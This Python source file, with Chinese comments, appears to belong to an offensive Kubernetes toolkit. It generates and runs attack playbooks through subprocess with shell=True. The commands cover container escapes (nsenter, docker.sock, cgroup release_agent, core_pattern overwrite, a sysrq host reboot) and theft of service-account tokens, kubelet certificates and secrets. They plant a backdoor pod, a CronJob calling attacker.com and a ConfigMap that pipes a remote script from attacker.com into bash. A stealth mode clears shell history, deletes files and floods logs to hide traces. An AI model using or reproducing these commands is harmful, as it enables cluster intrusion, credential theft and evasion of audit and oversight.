# -*- coding: utf-8 -*-
"""PlaybookExecutor - 攻击剧本执行器

v0.4: 将检测到的漏洞和环境特征转化为具体的、可执行的攻击命令。
使攻击链从"检测建议"变为"可操作步骤"，支持自动执行模式。

核心功能:
  - 根据环境画像生成具体的攻击命令序列
  - 整合容器逃逸向量为可执行步骤
  - 支持隐蔽模式（在关键步骤间插入痕迹清理）
  - 支持 --run 自动执行模式
  - 输出支持文本/JSON/Shell脚本格式
"""

from __future__ import annotations

import json
import subprocess
import sys
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Optional

from k8s_arsenal.escape.detector import detect_escape_vectors
from k8s_arsenal.escape.vectors import ESCAPE_VECTORS
from k8s_arsenal.models import EnvironmentProfile, EscapeVector, AttackPhase, RiskLevel
from k8s_arsenal.recon.k8s_enum import enumerate_environment


@dataclass
class ExecutableStep:
    """可执行攻击步骤

    每个步骤包含完整的信息——从命令本身到预期结果和风险提示，
    让操作者能清楚每一步在做什么、会发生什么、有多大风险。
    """

    step_number: int
    phase: str  # discovery / initial_access / execution / privesc / credential_access / lateral_movement / persistence / defense_evasion
    name: str
    description: str
    command: str
    prerequisites: list[str] = field(default_factory=list)
    expected_outcome: str = ""
    risk_level: str = "medium"
    detection_risk: str = "medium"
    cve: Optional[str] = None
    alternative_commands: list[str] = field(default_factory=list)
    cleanup_command: Optional[str] = None  # 该步骤完成后的痕迹清理命令


@dataclass
class PlaybookExecution:
    """完整攻击剧本

    包含从入口到目标的全链路可执行步骤。
    """

    name: str
    description: str
    generated_at: str = ""
    total_steps: int = 0
    estimated_time: str = "unknown"
    stealth_mode: bool = False
    environment_notes: list[str] = field(default_factory=list)
    steps: list[ExecutableStep] = field(default_factory=list)

    def __post_init__(self) -> None:
        if not self.generated_at:
            self.generated_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.total_steps = len(self.steps)

    def to_text(self) -> str:
        """格式化为可读文本（带颜色标记的 ASCII 输出）"""
        lines = [
            "=" * 60,
            f"  K8s Arsenal - 攻击剧本执行计划",
            f"  {self.name}",
            "=" * 60,
            f"  生成时间: {self.generated_at}",
            f"  总步数:   {self.total_steps}",
            f"  预估耗时: {self.estimated_time}",
            f"  隐蔽模式: {'开启' if self.stealth_mode else '关闭'}",
        ]
        if self.environment_notes:
            lines.append(f"  环境提示:")
            for note in self.environment_notes:
                lines.append(f"    - {note}")
        lines.append("=" * 60)
        lines.append("")

        for step in self.steps:
            cve_tag = f" [CVE-{step.cve}]" if step.cve else ""
            risk_icon = {
                "critical": "🔴",
                "high": "🟡",
                "medium": "🟢",
                "low": "⚪",
            }.get(step.risk_level, "⚪")

            lines.append(f"  [{step.step_number}] {risk_icon} {step.phase.upper()} - {step.name}{cve_tag}")
            lines.append(f"      {step.description}")
            lines.append(f"")
            lines.append(f"      $ {step.command}")

            if step.alternative_commands:
                lines.append(f"      备选:")
                for alt in step.alternative_commands:
                    lines.append(f"      $ {alt}")

            if step.expected_outcome:
                lines.append(f"      预期: {step.expected_outcome}")

            lines.append(f"      风险: {step.risk_level} | 被发现概率: {step.detection_risk}")

            if step.prerequisites:
                lines.append(f"      前置条件: {', '.join(step.prerequisites)}")

            if step.cleanup_command:
                lines.append(f"      清理: {step.cleanup_command}")

            lines.append(f"      {'─' * 50}")
            lines.append("")

        lines.append("=" * 60)
        lines.append("  提示: 请根据实际环境调整命令参数")
        lines.append("  Ctrl+C 可随时中断执行")
        lines.append("=" * 60)

        return "\n".join(lines)

    def to_shell_script(self) -> str:
        """生成可执行的 Shell 脚本"""
        lines = [
            "#!/bin/bash",
            "# K8s Arsenal - 自动攻击剧本",
            f"# {self.name}",
            f"# 生成时间: {self.generated_at}",
            f"# 隐蔽模式: {'开启' if self.stealth_mode else '关闭'}",
            "",
            "set -euo pipefail",  # 增强安全模式：未定义变量报错、管道中任意失败终止
            "",
            'echo "=== K8s Arsenal 攻击剧本执行 ==="',
            f'echo "目标: {self.name}"',
            'echo "按 Ctrl+C 中断"',
            'echo ""',
            "",
        ]

        for step in self.steps:
            lines.append("")
            lines.append("#" + "=" * 58)
            lines.append(f"# Step {step.step_number}: {step.name}")
            lines.append(f"# {step.description}")
            if step.cve:
                lines.append(f"# CVE: {step.cve}")
            lines.append("#" + "=" * 58)
            lines.append("")
            lines.append(f'echo "[{step.step_number}/{self.total_steps}] {step.name}"')
            # 使用双引号输出命令预览，避免单引号破坏 shell 语法
            escaped_preview = step.command.replace('"', '\\"')[:120]
            lines.append(f'echo "  Command: {escaped_preview}"')
            lines.append("")
            lines.append(step.command)
            lines.append("")

            if step.cleanup_command:
                lines.append(f'echo "  [清理] {step.cleanup_command}"')
                lines.append(step.cleanup_command)
                lines.append("")

            lines.append("")

        lines.append('echo ""')
        lines.append('echo "=== 剧本执行完毕 ==="')
        lines.append("")

        return "\n".join(lines)

    def to_json(self) -> dict[str, Any]:
        """序列化为 JSON 字典"""
        return {
            "name": self.name,
            "description": self.description,
            "generated_at": self.generated_at,
            "total_steps": self.total_steps,
            "estimated_time": self.estimated_time,
            "stealth_mode": self.stealth_mode,
            "environment_notes": self.environment_notes,
            "steps": [
                {
                    "step_number": s.step_number,
                    "phase": s.phase,
                    "name": s.name,
                    "description": s.description,
                    "command": s.command,
                    "prerequisites": s.prerequisites,
                    "expected_outcome": s.expected_outcome,
                    "risk_level": s.risk_level,
                    "detection_risk": s.detection_risk,
                    "cve": s.cve,
                    "alternative_commands": s.alternative_commands,
                    "cleanup_command": s.cleanup_command,
                }
                for s in self.steps
            ],
        }


class PlaybookExecutor:
    """攻击剧本执行器

    根据环境检测结果生成可执行的攻击步骤列表。
    每个步骤都包含具体的命令、预期结果和风险提示。

    用法:
        executor = PlaybookExecutor()
        plan = executor.generate(profile)
        print(plan.to_text())
    """

    def __init__(self, profile: Optional[EnvironmentProfile] = None):
        self.profile = profile or EnvironmentProfile()

    # ------------------------------------------------------------------
    # 主入口
    # ------------------------------------------------------------------

    def generate(
        self,
        profile: Optional[EnvironmentProfile] = None,
        stealth: bool = False,
    ) -> PlaybookExecution:
        """根据环境画像生成完整攻击剧本

        Args:
            profile: 环境画像（None 则自动检测）
            stealth: 是否启用隐蔽模式

        Returns:
            包含可执行步骤的攻击剧本
        """
        if profile is not None:
            self.profile = profile

        steps: list[ExecutableStep] = []
        notes: list[str] = []

        # 检测逃逸向量
        escape_vectors = detect_escape_vectors(self.profile)
        if escape_vectors:
            notes.append(f"发现 {len(escape_vectors)} 个可利用的逃逸向量")

        # 分阶段构建步骤
        steps.extend(self._build_recon_steps())
        steps.extend(self._build_escape_steps(escape_vectors))
        steps.extend(self._build_credential_steps())
        steps.extend(self._build_persistence_steps())

        # 统一分配 step 编号，消除各 _build_* 方法的重复计算
        for i, step in enumerate(steps, 1):
            step.step_number = i

        if stealth:
            steps = self._inject_cleanup_steps(steps)
            notes.append("隐蔽模式已开启：将在关键步骤后自动清理痕迹")

        # 环境提示
        if self.profile.host_pid and self.profile.host_network:
            notes.append("hostPID+hostNetwork 组合：可执行完整的节点级攻击")
        if self.profile.is_privileged:
            notes.append("特权容器：几乎所有逃逸技术都可用")

        notes.append(f"SA 权限可利用" if self.profile.service_account else "无 SA 绑定")

        # 估算时间
        total_commands = sum(1 + len(s.alternative_commands) for s in steps)
        est_time = f"约 {total_commands * 10} 秒" if total_commands < 20 else f"约 {total_commands * 5 // 60} 分钟"

        return PlaybookExecution(
            name=f"K8s 攻击剧本 - {self._get_env_label()}",
            description="基于环境画像自动生成的可执行攻击计划",
            estimated_time=est_time,
            stealth_mode=stealth,
            environment_notes=notes,
            steps=steps,
        )

    def execute(self, plan: PlaybookExecution, dry_run: bool = False) -> list[dict[str, Any]]:
        """执行攻击剧本

        Args:
            plan: 攻击剧本
            dry_run: 仅打印命令不实际执行

        Returns:
            每个步骤的执行结果列表
        """
        results: list[dict[str, Any]] = []

        print(f"\n{'=' * 60}")
        print(f"  K8s Arsenal - 攻击剧本执行")
        print(f"  目标: {plan.name}")
        print(f"  步数: {plan.total_steps}")
        print(f"  模式: {'演示(只打印不执行)' if dry_run else '执行'}")
        print(f"{'=' * 60}\n")

        for step in plan.steps:
            print(f"\n[{step.step_number}/{plan.total_steps}] {step.name}")
            print(f"  {step.description}")
            print(f"  > {step.command}")

            result: dict[str, Any] = {
                "step": step.step_number,
                "name": step.name,
                "command": step.command,
                "success": False,
                "output": "",
                "error": "",
            }

            if dry_run:
                result["success"] = True
                result["output"] = "[演示模式 - 未实际执行]"
            else:
                try:
                    output = subprocess.check_output(
                        step.command,
                        shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30,
                        text=True,
                    )
                    result["success"] = True
                    result["output"] = output.strip()
                    if output.strip():
                        print(f"  {output.strip()}")
                except subprocess.CalledProcessError as e:
                    result["error"] = str(e.output) if e.output else str(e)
                    print(f"  [失败] {result['error']}")
                except subprocess.TimeoutExpired:
                    result["error"] = "命令执行超时(30s)"
                    print(f"  [超时] {result['error']}")
                except Exception as e:
                    result["error"] = str(e)
                    print(f"  [异常] {result['error']}")

            # 打印预期结果提示
            if step.expected_outcome and not result["success"]:
                print(f"  预期输出类似: {step.expected_outcome[:60]}...")

            results.append(result)

        # 统计
        successes = sum(1 for r in results if r["success"])
        print(f"\n{'=' * 60}")
        print(f"  执行完成: {successes}/{len(results)} 步成功")
        print(f"{'=' * 60}")

        return results

    # ------------------------------------------------------------------
    # 内部步骤构建方法
    # ------------------------------------------------------------------

    def _get_env_label(self) -> str:
        """生成环境标签"""
        tags = []
        if self.profile.is_container:
            tags.append("容器内")
        if self.profile.is_kubernetes:
            tags.append("K8s")
        if self.profile.host_pid:
            tags.append("hostPID")
        if self.profile.host_network:
            tags.append("hostNet")
        if self.profile.is_privileged:
            tags.append("特权")
        return "+".join(tags) if tags else "未知环境"

    def _build_recon_steps(self) -> list[ExecutableStep]:
        """构建侦察阶段步骤"""
        steps: list[ExecutableStep] = []

        # 基础环境侦察
        steps.append(ExecutableStep(
            step_number=0,
            phase="discovery",
            name="当前命名空间信息",
            description="查看当前 Pod 所在命名空间和 SA 绑定",
            command="cat /var/run/secrets/kubernetes.io/serviceaccount/namespace",
            expected_outcome="default 或其他命名空间名称",
            risk_level="low",
            detection_risk="low",
        ))

        # K8s API 可用性检测
        steps.append(ExecutableStep(
            step_number=0,
            phase="discovery",
            name="K8s API Server 可达性",
            description="确认能否从 Pod 内访问 K8s API Server",
            command="curl -k -s --connect-timeout 5 https://kubernetes.default.svc/healthz || echo 'API Server 不可达'",
            expected_outcome="ok (200) 或连接超时",
            risk_level="low",
            detection_risk="low",
        ))

        if self.profile.is_kubernetes:
            # SA 权限检测
            steps.append(ExecutableStep(
                step_number=0,
                phase="discovery",
                name="SA 权限枚举",
                description="查看当前 ServiceAccount 拥有的权限",
                command="kubectl auth can-i --list 2>/dev/null || echo 'kubectl 不可用，尝试直接调用 API'",
                expected_outcome="显示当前 SA 可执行的操作列表",
                risk_level="low",
                detection_risk="medium",
                alternative_commands=[
                    "curl -sk -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
                ],
            ))

            # Secrets 枚举
            steps.append(ExecutableStep(
                step_number=0,
                phase="discovery",
                name="Secrets 枚举",
                description="查看可访问的 Secrets（可能包含敏感凭证）",
                command="kubectl get secrets --all-namespaces 2>/dev/null | head -30",
                expected_outcome="列出所有可访问的 Secret",
                risk_level="medium",
                detection_risk="medium",
            ))

        # 进程信息
        if self.profile.host_pid:
            steps.append(ExecutableStep(
                step_number=0,
                phase="discovery",
                name="宿主机进程列表",
                description="通过 hostPID 查看宿主机所有进程",
                command="ps auxf --forest 2>/dev/null || ps aux 2>/dev/null",
                expected_outcome="显示宿主机完整进程树",
                risk_level="medium",
                detection_risk="high",
                alternative_commands=[
                    "ls -la /proc/1/root/  # 查看宿主机根目录",
                ],
            ))

        # 网络侦察
        if self.profile.host_network:
            steps.append(ExecutableStep(
                step_number=0,
                phase="discovery",
                name="宿主机网络探测",
                description="通过 hostNetwork 探测宿主机网络服务和开放端口",
                command="ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null",
                expected_outcome="显示宿主机所有监听端口",
                risk_level="low",
                detection_risk="medium",
                alternative_commands=[
                    "curl -k https://localhost:10250/pods 2>/dev/null | head -20  # 探测 kubelet",
                    "curl -sk https://localhost:6443/healthz 2>/dev/null  # 探测 API Server",
                ],
            ))

        return steps

    def _build_escape_steps(self, escape_vectors: list[EscapeVector]) -> list[ExecutableStep]:
        """根据检测到的逃逸向量生成逃逸步骤"""
        steps: list[ExecutableStep] = []

        if not escape_vectors:
            return steps

        # 按危险程度排序：高成功率 + 难检测的优先
        sorted_vectors = sorted(
            escape_vectors,
            key=lambda v: (
                0 if v.success_rate == "critical" else
                1 if v.success_rate == "high" and v.detection_difficulty == "hard" else
                2 if v.success_rate == "high" else
                3 if v.success_rate == "medium" else 4
            ),
        )

        for vector in sorted_vectors:
            # 确定主命令
            command = self._get_vector_command(vector)
            if not command:
                continue

            # 确定风险等级
            risk_level = "critical" if vector.success_rate == "critical" else "high"
            detection_risk = "high" if vector.detection_difficulty == "hard" else (
                "medium" if vector.detection_difficulty == "medium" else "low"
            )

            # 确定阶段映射
            phase_str = {
                AttackPhase.PRIVILEGE_ESCALATION: "privesc",
                AttackPhase.EXECUTION: "execution",
                AttackPhase.DISCOVERY: "discovery",
                AttackPhase.CREDENTIAL_ACCESS: "credential_access",
                AttackPhase.IMPACT: "impact",
                AttackPhase.LATERAL_MOVEMENT: "lateral_movement",
            }.get(vector.phase, "execution")

            steps.append(ExecutableStep(
                step_number=0,
                phase=phase_str,
                name=vector.name,
                description=vector.description[:100],
                command=command,
                prerequisites=vector.required_conditions + vector.required_capabilities,
                expected_outcome=f"成功利用 {vector.name}，获得目标访问权限",
                risk_level=risk_level,
                detection_risk=detection_risk,
                cve=vector.cve,
                cleanup_command=self._get_cleanup_for_vector(vector),
            ))

        return steps

    # Vector ID → _ESCAPE_COMMANDS key 直接映射（避免自然语言子串匹配的脆弱性）
    _VECTOR_ID_MAP: dict[str, str] = {
        "ESC-001": "nsenter",
        "ESC-002": "docker_sock",
        "ESC-003": "cgroup",
        "ESC-004": "privileged",
        "ESC-005": "hostnetwork",
        "ESC-006": "sysrq",
        "ESC-007": "module",
        "ESC-008": "device_mapper",
        "ESC-009": "ptrace",
        "ESC-010": "cri",
        "ESC-011": "core_patterns",
        "ESC-012": "kubelet",
    }

    _ESCAPE_COMMANDS: dict[str, tuple[str, str]] = {
        "nsenter": (
            "nsenter -t 1 -m -u -i -n -p -- bash -c 'id; cat /etc/kubernetes/pki/ca.crt 2>/dev/null | head -3'",
            'history -c 2>/dev/null; rm -f /tmp/.bash_history 2>/dev/null; unset HISTFILE',
        ),
        "docker_sock": (
            "docker run --privileged --pid=host --net=host -v /:/host alpine chroot /host bash",
            None,
        ),
        "cgroup": (
            "mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && "
            "mkdir -p /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && "
            'host_path=$(sed -n "s/.*\\/percore_payload=\\([^ ]*\\).*/\\1/p" /proc/cmdline) && '
            'echo "$host_path/pwn" > /tmp/cgrp/release_agent && '
            'echo -e "#!/bin/bash\\nkubectl get secrets --all-namespaces > /tmp/exfil_data" > /pwn && '
            "chmod +x /pwn && sh -c 'echo $$ > /tmp/cgrp/x/cgroup.procs' && sleep 2 && cat /tmp/exfil_data",
            "rm -rf /tmp/cgrp /cmd 2>/dev/null",
        ),
        "privileged": (
            "mkdir -p /mnt/host && "
            "mount -t proc none /mnt/host 2>/dev/null || "
            "mount --bind /proc/1/root /mnt/host 2>/dev/null; "
            "ls /mnt/host/etc/kubernetes/pki/ 2>/dev/null",
            "rm -rf /mnt/host 2>/dev/null",
        ),
        "module": (
            "ls /lib/modules/$(uname -r)/kernel/ 2>/dev/null | head -20; "
            'echo "需要编译内核模块并加载: insmod /tmp/exploit.ko"',
            "rmmod malicious_mod 2>/dev/null; rm -f /tmp/*.ko 2>/dev/null",
        ),
        "device_mapper": (
            'echo "需要 dmsetup 创建 device mapper 映射: dmsetup create host-root --table \"0 40960 linear /dev/sda1 0\""',
            "dmsetup remove host-root 2>/dev/null; dmsetup remove vicitm-root 2>/dev/null",
        ),
        "core_patterns": (
            'echo "|/tmp/exploit.sh" > /proc/sys/kernel/core_pattern; '
            'echo "core_pattern 已覆写: 宿主机进程崩溃时将触发 /tmp/exploit.sh"',
            'echo "core" > /proc/sys/kernel/core_pattern 2>/dev/null',
        ),
        "ptrace": (
            "apt-get update -qq && apt-get install -y -qq gdb 2>/dev/null; "
            "gdb -p 1 -batch -ex 'dump memory /tmp/mem.dump 0x7ffff7ff0000 0x7ffff7ff1000' 2>/dev/null || "
            'echo "PTRACE 可用: gdb -p <PID> 可注入进程"',
            None,
        ),
        "hostnetwork": (
            "apt-get update -qq && apt-get install -y -qq tcpdump 2>/dev/null; "
            "timeout 3 tcpdump -i any -c 5 -nn 2>/dev/null || "
            "cat /proc/net/tcp | head -10",
            None,
        ),
        "kubelet": (
            "cat /var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null && "
            "cat /var/lib/kubelet/pki/kubelet-server-current.pem 2>/dev/null || "
            "echo 'kubelet 凭证不可读，尝试其他路径'; "
            "find /var/lib/kubelet -name '*.pem' 2>/dev/null | head -5",
            'history -c 2>/dev/null; rm -f /tmp/kubelet-* 2>/dev/null',
        ),
        "sysrq": (
            'echo b > /proc/sysrq-trigger 2>/dev/null && echo "宿主机即将重启" || echo "sysrq 不可用"',
            None,
        ),
        "cri": (
            "ls -la /var/run/docker.sock /run/containerd/containerd.sock /var/run/crio/crio.sock 2>/dev/null; "
            'env | grep -i sock 2>/dev/null',
            None,
        ),
    }

    def _get_vector_command(self, vector: EscapeVector) -> str | None:
        """
        根据 vector.id 直接从 _ESCAPE_COMMANDS 查找对应的执行命令。
        
        使用 _VECTOR_ID_MAP 做直接 ID 映射，避免自然语言子串匹配
        导致的漏匹配和误匹配问题。
        """
        key = self._VECTOR_ID_MAP.get(vector.id)
        if key and key in self._ESCAPE_COMMANDS:
            cmd, _ = self._ESCAPE_COMMANDS[key]
            return cmd

        # 回退：从描述中提取命令（引号内可能包含命令示例）
        if "'" in vector.description or "`" in vector.description or "$(" in vector.description:
            return vector.description.split("。")[0].strip()

        return None

    def _get_cleanup_for_vector(self, vector: EscapeVector) -> str | None:
        """
        根据 vector.id 直接从 _ESCAPE_COMMANDS 查找对应的清理命令。
        使用 _VECTOR_ID_MAP 做直接 ID 映射。
        """
        key = self._VECTOR_ID_MAP.get(vector.id)
        if key and key in self._ESCAPE_COMMANDS:
            _, cleanup = self._ESCAPE_COMMANDS[key]
            return cleanup
        return None

    def _build_credential_steps(self) -> list[ExecutableStep]:
        """构建凭证窃取阶段步骤"""
        steps: list[ExecutableStep] = []

        if not self.profile.is_kubernetes:
            return steps

        # SA Token 读取
        steps.append(ExecutableStep(
            step_number=0,
            phase="credential_access",
            name="SA Token 提取",
            description="读取当前 Pod 绑定的 ServiceAccount Token，可用于 API 调用",
            command="cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 2>/dev/null | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 100",
            expected_outcome="JWT Token 的 payload 部分（包含 SA 名称和过期时间）",
            risk_level="high",
            detection_risk="low",
        ))

        # Kubelet 凭证（如果 hostPID）
        if self.profile.host_pid:
            steps.append(ExecutableStep(
                step_number=0,
                phase="credential_access",
                name="kubelet 凭证窃取",
                description="通过 hostPID 读取 kubelet 客户端证书，可用于 nodes/proxy 接口",
                command=(
                    "find /var/lib/kubelet/pki/ -name '*.pem' -exec echo '=== {} ===' \\; -exec openssl x509 -in {} -text -noout 2>/dev/null \\; | head -50"
                ),
                expected_outcome="kubelet 的 x509 证书信息",
                risk_level="critical",
                detection_risk="high",
                alternative_commands=[
                    "cat /var/lib/kubelet/pki/kubelet-client-current.pem 2>/dev/null",
                    "cat /var/lib/kubelet/pki/kubelet.crt 2>/dev/null",
                ],
                cleanup_command='history -c 2>/dev/null; rm -f /tmp/kubelet-* 2>/dev/null',
            ))

        # ConfigMap / Secret 批量提取
        steps.append(ExecutableStep(
            step_number=0,
            phase="credential_access",
            name="Secrets/ConfigMaps 批量导出",
            description="尝试读取所有命名空间的 Secret 和 ConfigMap",
            command="kubectl get secrets --all-namespaces -o json 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); [print(f'{i[\\\"metadata\\\"][\\\"namespace\\\"]}/{i[\\\"metadata\\\"][\\\"name\\\"]}') for i in d.get('items',[])]\" 2>/dev/null | head -20",
            expected_outcome="所有可访问的 Secret 列表",
            risk_level="high",
            detection_risk="medium",
            cleanup_command='history -c 2>/dev/null; unset HISTFILE',
        ))

        return steps

    def _build_persistence_steps(self) -> list[ExecutableStep]:
        """构建持久化阶段步骤"""
        steps: list[ExecutableStep] = []

        if not self.profile.is_kubernetes:
            return steps

        # 创建后门 Pod
        steps.append(ExecutableStep(
            step_number=0,
            phase="persistence",
            name="后门 Pod 部署",
            description="创建特权的后门 Pod 以维持持久访问（适用于 SA 有 create pods 权限）",
            command="kubectl run backdoor --image=k8s-arsenal-pod:latest --restart=Always 2>/dev/null || echo 'kubectl 不可用或无权限创建 Pod'",
            expected_outcome="backdoor Pod 创建成功（Running 状态）",
            risk_level="high",
            detection_risk="high",
            alternative_commands=[
                "kubectl run stealth --image=busybox:1.36.1 --command -- sleep 86400",
                "kubectl run backdoor --image=nginx:alpine --restart=Always 2>/dev/null || echo 'kubectl 不可用'",
            ],
            cleanup_command="kubectl delete pod backdoor --force --grace-period=0 2>/dev/null",
        ))

        # CronJob 持久化
        steps.append(ExecutableStep(
            step_number=0,
            phase="persistence",
            name="CronJob 持久化后门",
            description="创建 CronJob 每 30 分钟反弹 shell，维持长期访问",
            command=(
                "cat << 'EOF' | kubectl apply -f - 2>/dev/null\n"
                "apiVersion: batch/v1\n"
                "kind: CronJob\n"
                "metadata:\n"
                "  name: stealth-connector\n"
                "spec:\n"
                "  schedule: \"*/30 * * * *\"\n"
                "  jobTemplate:\n"
                "    spec:\n"
                "      template:\n"
                "        spec:\n"
                "          containers:\n"
                "          - name: connector\n"
                "            image: alpine:3.18\n"
                "            command: [\"sh\", \"-c\", \"wget -q -O- http://attacker.com/check 2>/dev/null || true\"]\n"
                "          restartPolicy: Never\n"
                "EOF"
            ),
            expected_outcome="CronJob stealth-connector 创建成功",
            risk_level="high",
            detection_risk="high",
            cleanup_command="kubectl delete cronjob stealth-connector 2>/dev/null",
        ))

        # Configuration 篡改（恶意 ConfigMap / Secret）
        steps.append(ExecutableStep(
            step_number=0,
            phase="persistence",
            name="恶意 ConfigMap 注入",
            description="创建包含恶意脚本的 ConfigMap，后续挂载到正常 Pod 中执行",
            command=(
                "cat << 'EOF' | kubectl apply -f - 2>/dev/null\n"
                "apiVersion: v1\n"
                "kind: ConfigMap\n"
                "metadata:\n"
                "  name: malicious-config\n"
                "data:\n"
                "  payload.sh: |\n"
                "    #!/bin/bash\n"
                "    curl -sk https://attacker.com/backdoor.sh | bash\n"
                "  config.json: |\n"
                '    {"backdoor": "enabled", "server": "attacker.com:4443"}\n'
                "EOF"
            ),
            expected_outcome="ConfigMap malicious-config 创建成功",
            risk_level="medium",
            detection_risk="medium",
            cleanup_command="kubectl delete configmap malicious-config 2>/dev/null",
        ))

        return steps

    def _inject_cleanup_steps(self, steps: list[ExecutableStep]) -> list[ExecutableStep]:
        """在关键步骤后插入痕迹清理步骤"""
        result: list[ExecutableStep] = []
        step_counter = 0

        defense_evasion_steps = [
            # Bash 历史清理
            ExecutableStep(
                step_number=0,  # placeholder
                phase="defense_evasion",
                name="Shell 历史清理",
                description="清除当前 shell 会话的命令历史记录",
                command='history -c 2>/dev/null; rm -f ~/.bash_history /tmp/.bash_history 2>/dev/null; unset HISTFILE',
                expected_outcome="命令历史被清除",
                risk_level="low",
                detection_risk="low",
            ),
            # 日志文件清理
            ExecutableStep(
                step_number=0,
                phase="defense_evasion",
                name="临时文件清理",
                description="删除执行过程中产生的临时文件",
                command='rm -rf /tmp/*.sh /tmp/*.py /tmp/*.so /tmp/*.ko /tmp/pwn* /tmp/cgrp* /tmp/mem* /tmp/exfil* 2>/dev/null; sync',
                expected_outcome="临时文件被删除",
                risk_level="low",
                detection_risk="low",
            ),
            # Auditd 日志干扰（如果可用）
            ExecutableStep(
                step_number=0,
                phase="defense_evasion",
                name="日志干扰（可选）",
                description="如果 Pod 内有日志写入权限，生成大量无关日志稀释攻击痕迹",
                command='for i in $(seq 1 100); do logger "INFO: normal operation heartbeat $i"; done 2>/dev/null; echo "日志稀释完成" || echo "日志写入不可用，跳过"',
                expected_outcome="审计日志中混入了大量正常日志条目",
                risk_level="medium",
                detection_risk="medium",
            ),
        ]

        for step in steps:
            step_counter += 1
            step.step_number = step_counter
            result.append(step)

            # 在提权、逃逸、凭证窃取步骤后插入清理
            if step.phase in ("privesc", "execution", "credential_access"):
                step_counter += 1
                cleanup = ExecutableStep(
                    step_number=step_counter,
                    phase="defense_evasion",
                    name=f"痕迹清理 (after {step.name[:20]})",
                    description=f"执行 {step.name} 后的痕迹清理",
                    command='history -c 2>/dev/null; rm -f /tmp/*.log /tmp/*.dump 2>/dev/null; unset HISTFILE',
                    expected_outcome="攻击痕迹被清理",
                    risk_level="low",
                    detection_risk="low",
                    cleanup_command="history -c",
                )
                result.append(cleanup)

        return result
